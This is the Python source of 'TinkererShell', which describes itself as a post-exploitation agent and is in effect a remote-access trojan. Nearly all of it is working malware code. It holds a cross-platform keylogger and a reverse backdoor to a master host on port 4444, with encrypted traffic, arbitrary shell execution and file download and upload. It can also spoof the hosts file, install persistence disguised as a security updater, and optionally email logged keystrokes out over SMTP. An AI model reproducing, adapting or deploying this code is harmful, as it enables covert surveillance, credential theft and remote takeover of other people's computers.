#!/usr/bin/python
# -*- coding: utf-8 -*-
"""TinkererShell bot, a simple agent for post exploitation.\n"""

# Written By Tinkerer: https://github.com/4n4nk3
import base64
import os
import random
import socket
import string
import subprocess
import sys
import tempfile
import threading
import time
from filecmp import cmp
from tendo import singleton
# pycrypto
from Crypto.Cipher import AES


# Importing module for autostart written by Jonas Wagner
# http://29a.ch/2009/3/17/autostart-autorun-with-python
import autorun

# Activating mailsender (True)
mailactivation = False
# Activating persistence (True)
persistenceactivation = False

# Global variables
global platform
global thr_block
global thr_exit

# I understand on wich system I am and then I import the corrects modules for the keylogger
if os.name == 'nt':
    platform = 'windows'
    import pythoncom
    import pyHook
elif os.name == 'posix':
    platform = 'posix'
    import pyxhook
    import shutil
else:
    sys.exit('System not supported!')

fd_temp, keylogfile = tempfile.mkstemp()
with open(keylogfile, 'w') as f:
    f.write('')


def generate_random_string(low: int, high: int) -> str:
    """Generate a random string.\n"""
    length = random.randint(low, high)
    letters = string.ascii_letters + string.digits
    return ''.join([random.choice(letters) for _ in range(length)])


# =================================================================================================

def persistence_install() -> bool:
    """Install persistence.\n"""
    # TODO: Fix whole function, final_path variable unused
    # TODO: Find a path writable to user with low privs
    path = os.path.abspath(sys.argv[0])
    if platform == 'windows':
        target_to_autostart = os.getenv('WINDIR') + os.path.normcase('demo/sec_upd.exe')
        if not os.path.isfile(target_to_autostart):
            persist_name = generate_random_string(10, 15) + '.exe'
            final_path = os.getenv('WINDIR') + os.path.normcase('/demo"/. /.. /"')
            try:
                # cd C:\Windows && mkdir \\?\C:\Windows\". \.. \" && copy file.exe \\?\C:\Windows\". \.. \"file.exe
                # && mklink sigmund.exe \\?\C:\Windows\". \.. \"file.exe
                proc = subprocess.Popen(('cd ' + os.getenv('WINDIR') + os.path.normcase(' && mkdir //?/') + os.getenv(
                    'WINDIR') + os.path.normcase('/demo"/. /.. /" && copy ') + path + os.path.normcase(
                    ' //?/C:/Windows/demo"/. /.. /"') + persist_name + os.path.normcase(
                    ' && mklink /demo/sec_upd.exe //?/C:/Windows/demo/". /.. /"') + persist_name), shell=True,
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            except Exception as exception:
                print(exception)
    else:
        target_to_autostart = '/.Xsec_upd'
        if not os.path.isfile(target_to_autostart):
            shutil.copyfile(path, target_to_autostart)

    if not autorun.exists('SecurityPyUpdater'):
        autorun.add('SecurityPyUpdater', target_to_autostart)
        return True
    else:
        return False


def persistence_remove() -> bool:
    """Uninstall persistence.\n"""
    if autorun.exists('SecurityPyUpdater'):
        autorun.remove('SecurityPyUpdater')
        return True
    else:
        return False


def persistence_status() -> bool:
    """Check if persistence is installed.\n"""
    if autorun.exists('SecurityPyUpdater'):
        return True
    else:
        return False


# Persistence !!!
if persistenceactivation is True:
    persistence_install()

# Verify only one istance of TinkererShell is running
me = singleton.SingleInstance()


def receiver() -> str:
    """Receive data from master, decrypt it and return it.\n"""
    lengthcrypt = s.recv(1024)
    expected_length = int(DecodeAES(cipher, lengthcrypt))
    encrypted_received_data = ''
    while len(encrypted_received_data) < expected_length:
        encrypted_received_data += s.recv(1024).decode('utf-8')
    return DecodeAES(cipher, encrypted_received_data)


def sender(data_to_send: str) -> None:
    """Encrypt data and send it to master.\n"""
    # If data = 0 I will set an arbitrary string so sending operation will not be NULL
    if len(data_to_send) == 0:
        data_to_send = 'Ok (no output)\n'
    # Crypting data, obtaining their length and then typecasting it to data_to_send string and crypting it
    encoded = EncodeAES(cipher, data_to_send)
    length = str(len(encoded))
    length_crypt = EncodeAES(cipher, length)
    # Sending the length and wait. Then send data
    s.send(length_crypt)
    time.sleep(1)
    s.send(encoded)


def command_executer(command: str):
    """Execute a command in the system shell ans send its output to the master.\n"""
    try:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        # Reading and sending output
        sender((proc.stdout.read() + proc.stderr.read()).decode('utf-8'))
    except Exception as exception:
        sender('reachedexcept')
        sender(str(exception))


def listprocesses():
    """List running processes.\n"""
    if platform == 'windows':
        command_executer('tasklist')
    else:
        command_executer('pstree -u -p')


def killprocesses():
    """Kill a running process.\n"""
    if platform == 'windows':
        sender('Insert the name of the process\t\texample.exe\n')
    else:
        sender('Insert process PID\n')
    process_id = receiver()
    if platform == 'windows':
        command_executer('TASKKILL /IM ' + process_id + ' /F /T')
    else:
        command_executer('kill -9 ' + process_id)


def dnsspoofer(dnsfile: str):
    """Edit hosts file to redirect user when visiting a specified domain.\n"""
    sender('Insert address from which you want to redirect\n')
    orig_address = receiver()
    sender('Insert address to which you want to redirect\n')
    evil_address = receiver()
    if os.access(dnsfile, os.W_OK):
        try:
            f = open(dnsfile, 'r')
            original_hosts_file = f.read()
            f.close()
            f = open(dnsfile, 'w')
            f.write(original_hosts_file + '\n' + evil_address + '    ' + orig_address)
            f.close()
            sender('Operation completed\n')
        except Exception as exception:
            sender(str(exception))
    else:
        sender('Operation aborted! Cannot write to target file!\n')


def dnscleaner(dnsfile: str, dnsbackup: str, send=False):
    """Restore original hosts file from backup made at shell startup.\n"""
    if os.access(dnsfile, os.W_OK):
        try:
            f = open(dnsbackup, 'r')
            buffer = f.read()
            f.close()
            f = open(dnsfile, 'w')
            f.write(buffer)
            f.close()
            if send is True:
                sender('DNS cleaned\n')
        except Exception as exception:
            if send is True:
                sender(str(exception))
    else:
        if send is True:
            sender('Operation aborted! Cannot write to target file!\n')


def keylogs_status():
    """Check if keylogger thread is capturing data.\n"""
    if thr_block.isSet():
        sender('Keylogger is not running!\n')
    else:
        sender('Keylogger is running!\n')


def keylogs_start():
    """Enable keylogger thread to capture data.\n"""
    if thr_block.isSet():
        thr_block.clear()
        sender('Keylogger started!\n')
    else:
        sender('Keylogger is already running!\n')


def keylogs_stop():
    """Disable keylogger thread from capturing data.\n"""
    if not thr_block.isSet():
        thr_block.set()
        sender('Keylogger stopped!\n')
    else:
        sender('Keylogger is not running!\n')


def keylogs_download(keylogfile: str):
    """Send keylogged data to the master and delete it from victim host.\n"""
    try:
        f = open(keylogfile, 'r')
        keylogged_data = f.read()
        f.close()
        sender(keylogged_data + '\n')
    except Exception as exception:
        sender('reachedexcept')
        sender(str(exception))
    try:
        cleaner = open(keylogfile, 'w')
        cleaner.write('')
        cleaner.close()
    except Exception as exception:
        print(exception)


def downloader():
    """Download a file from victim host to master.\n"""
    sender('Insert name of the file\t\t' + os.path.normcase('C:/boot.ini') + '\n')
    try:
        file_name = os.path.normcase(receiver())
        # Reading file in binary form
        f = open(file_name, 'rb')
        a = f.read()
        f.close()
    except Exception as exception:
        sender('reachedexcept')
        a = str(exception)
    sender(a)


def uploader():
    """Upload a file from master to victim host.\n"""
    filename = os.path.normcase(receiver())
    uploaded_data: str = receiver()
    if uploaded_data != 'reachedexcept':
        if os.access(filename, os.W_OK):
            try:
                # Writing file in binary form
                filewrite = open(filename, 'wb')
                filewrite.write(bytes(uploaded_data))
                filewrite.close()
                sender('File saved in ' + filename + '\n')
            except Exception as exception:
                sender(str(exception))
        else:
            sender('Operation aborted! Cannot write to target file!\n')
    else:
        sender('Operation aborted\n')


# =================================================================================================

# Defining correct keylogging procedure
def keylogger(fd_temp: int, keylogfile: str):
    """Key logger thread.\n"""

    def OnKeyboardEvent(event):
        """"Define action triggered when a key is pressed.\n"""
        if not thr_block.isSet():
            if event.Ascii != 0 or 8:
                with open(keylogfile, 'a') as f:
                    if event.Key == 'space':
                        f.write(' ')
                    elif event.Key == 'BackSpace':
                        f.write('[BackSpace]')
                    elif event.Key == 'Return':
                        f.write('[Enter]')
                    elif event.Key == 'Shift_L':
                        f.write('[Shift_L]')
                    elif event.Key == 'Shift_R':
                        f.write('[Shift_R]')
                    elif event.Key == 'Tab':
                        f.write('[Tab]')
                    else:
                        f.write(event.Key)
        if thr_exit.isSet():
            os.close(fd_temp)
            sys.exit(0)
        return True

    # create a hook manager
    if platform == 'windows':
        hm = pyHook.HookManager()
    else:
        hm = pyxhook.HookManager()
    # watch for all mouse events
    hm.KeyDown = OnKeyboardEvent
    # set the hook
    hm.HookKeyboard()
    # wait forever
    if platform == 'windows':
        pythoncom.PumpMessages()
    else:
        hm.start()


# =================================================================================================

if mailactivation is True:
    import smtplib
    from email.mime.text import MIMEText


    def mailsender(keylogfile: str):
        """Thread to send keylogged data via email evry 5 minutes (300 seconds).\n"""
        username = 'name'
        password = 'password'

        sender_email = 'sender@yahoo.it'
        receiver_email = 'reciver@yahoo.it'

        msg['Subject'] = 'Logged keystrokes'
        msg['From'] = sender_email
        msg['To'] = receiver_email

        while 1:
            time.sleep(300)
            if not thr_block.isSet():
                try:
                    fo = open(keylogfile, 'r')
                    msg = MIMEText(fo.read())
                    fo.close()
                except Exception as exception:
                    print(exception)
                try:
                    mail_socket = smtplib.SMTP_SSL('smtp.mail.yahoo.com:465')
                    mail_socket.login(username, password)
                    mail_socket.sendmail(sender_email, [receiver_email], msg.as_string())
                    mail_socket.close()
                    print('Successfully sent email')
                except Exception as exception:
                    print(exception)


# =================================================================================================

def backdoor(mailactivation: bool, keylogfile: str):
    """Shell thread that connect to master and permit control over the agent.\n"""
    host = '127.0.0.1'  # Remote host to wich you want the backdoor to connect to
    port = 4444  # The connection port to use

    # Defining global the variables that I need to use in many different functions
    global s
    global cipher
    global EncodeAES
    global DecodeAES

    # Creating the socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if platform == 'windows':
        dnsfile = os.getenv('WINDIR') + os.path.normcase('/system32/drivers/etc/hosts')
        dnsbackup = tempfile.gettempdir() + os.path.normcase('/spoofbackup')
    else:
        dnsfile = '/etc/hosts'
        dnsbackup = tempfile.gettempdir() + '/spoofbackup'

    # Backing up Hosts file
    f = open(dnsfile, 'r')
    buffer = f.read()
    f.close()
    f = open(dnsbackup, 'w')
    f.write(buffer)
    f.close()

    # Setting parameters required for crypting comunications
    block_size = 32
    padding = '{'
    pad = lambda s: s + (block_size - len(s) % block_size) * padding
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).decode('utf-8').rstrip(padding)
    # Setting password for crypting packets
    secret = '4n4nk353hlli5w311d0n3andI1ik3it!'
    cipher = AES.new(secret)
    del secret

    # Connection loop
    while 1:
        try:
            # Connecting to the client
            s.connect((host, port))
            # Sending information relatives to the infected system
            proc = subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            a = (proc.stdout.read() + proc.stderr.read()).decode('utf-8')
            s.send(str.encode('Logged in as: {}'.format(a)))
            print('Connection successfull')
            break
        # If i cannot connect I wait 2 minutes and then I retry
        except Exception as exception:
            print(exception)
            print('>>> New attempt in 2 min')
            time.sleep(30)
            print('>>> New attempt in 1,5 min')
            time.sleep(30)
            print('>>> New attempt in 1 min')
            time.sleep(30)
            print('>>> New attempt in 30 sec')
            time.sleep(30)

    # Commands loop
    while 1:
        received_command = receiver()
        if received_command == 'SHquit':
            sender('mistochiudendo')
            break
        elif received_command == 'SHprocesslist':
            listprocesses()
        elif received_command == 'SHprocesskill':
            killprocesses()
        elif received_command == 'SHdnsstart':
            dnsspoofer(dnsfile)
        elif received_command == 'SHdnsstop':
            if cmp(dnsfile, dnsbackup) is False:
                dnscleaner(dnsfile, dnsbackup, send=True)
            else:
                sender('Original hosts file and current one are the same! Nothing to change.')
        elif received_command == 'SHdownload':
            downloader()
        elif received_command == 'SHupload':
            uploader()
        elif received_command == 'SHkeylogstatus':
            keylogs_status()
        elif received_command == 'SHkeylogstart':
            keylogs_start()
        elif received_command == 'SHkeylogstop':
            keylogs_stop()
        elif received_command == 'SHkeylogdownload':
            keylogs_download(keylogfile)
        elif received_command == 'SHpersistenceenable':
            if persistence_install():
                sender('Persistence installation succesfull!')
            else:
                sender('Persistence already installed!')
        elif received_command == 'SHpersistencedisable':
            if persistence_remove():
                sender('Persistence remove successful!')
            else:
                sender('Persistence not yet installed!')
        elif received_command == 'SHpersistencestatus':
            if persistence_status():
                sender('Persistence is installed.')
            else:
                sender('Persistence is not installed.')
        else:
            command_executer(received_command)

    # Recreating original hosts file of the system
    if cmp(dnsfile, dnsbackup) is False:
        dnscleaner(dnsfile, dnsbackup)
    try:
        os.remove("ChangedFile.csv")
    except Exception as exception:
        print(exception)
    # Closing socket
    s.close()
    print('Connection closed')
    # If thr_exit.set() next keystroke will terminate keylogger thread
    if mailactivation is False:
        thr_exit.set()
    return True


thr_block = threading.Event()
thr_exit = threading.Event()

# Keylogger's thread
thread1 = threading.Thread(name='sic1', target=keylogger, args=(fd_temp, keylogfile)).start()
# Backdoor's thread
thread2 = threading.Thread(name='sic2', target=backdoor, args=(mailactivation, keylogfile)).start()
# If mailactivation setted I define the mailsender thread
if mailactivation is True:
    thread3 = threading.Thread(name='sic3', target=mailsender, args=keylogfile).start()

# TODO: Encrypt keylogged data Probably gonna create an array, flush it to file everytime len(buffer) >= 5k. Read
#  encrypted file, decrypt, add buffer to decrypted_buffer, encrypt, write to file. Must make sure to flush buffer to
#  file when 'SHkeylog download' is called.

# TODO: Split source in modules

# TODO: Configure/Enable/Disable mail activation from shell cmd

# TODO: Keylogger: write data do disk encrypted
# TODO: Keylogger add clipboard (trigger on ctrl+c and ctrl+v)

# TODO: Add active window recognition
# TODO: Add screenshooter
# TODO: Add Webcam and microphone
